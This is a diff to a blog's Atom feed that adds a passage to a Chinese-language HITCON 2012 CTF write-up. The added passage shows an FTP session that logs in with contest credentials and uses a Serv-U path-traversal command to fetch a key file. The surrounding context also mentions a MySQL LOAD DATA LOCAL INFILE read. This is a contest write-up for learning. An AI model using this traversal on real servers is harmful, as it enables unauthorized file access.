@@ -4,7 +4,7 @@
   <title><![CDATA[blog.dm4.tw]]></title>
   <link href="http://blog.dm4.tw/atom.xml" rel="self"/>
   <link href="http://blog.dm4.tw/"/>
-  <updated>2012-07-24T16:30:47+08:00</updated>
+  <updated>2012-07-24T20:15:49+08:00</updated>
   <id>http://blog.dm4.tw/</id>
   <author>
     <name><![CDATA[dm4]]></name>
@@ -107,6 +107,26 @@ LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
 <p>nmap 完之後發現有開 ftp ，查了一下發現有 <a href="http://www.exploit-db.com/exploits/18182/">Serv-U FTP Jail Break</a>
 和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
 回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>
+
+<p>關鍵是 <code>Plz Input "Your" Real ID:</code> 要用 <code>wargame.hitcon.org</code> 的帳號去 generate key.txt 接下來就：</p>
+
+<pre><code>[~] ➟  ftp jumpochisun.blogsyte.com
+Connected to jumpochisun.blogsyte.com.
+220 Serv-U FTP Server v6.4 for WinSock ready...
+Name (jumpochisun.blogsyte.com:dm4): hitcon2012
+331 User name okay, need password.
+Password: 
+230 User logged in, proceed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; get ..:/..:/..:/..:/key/dm4key.txt key.txt
+local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
+227 Entering Passive Mode (114,36,241,246,15,231)
+150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
+100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
+226 Transfer complete.
+28 bytes received in 00:00 (0.80 KiB/s)
+</code></pre>
 
 <p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
 不過看到結束還是沒找到應該怎麼解&#8230;&#8230;</p>
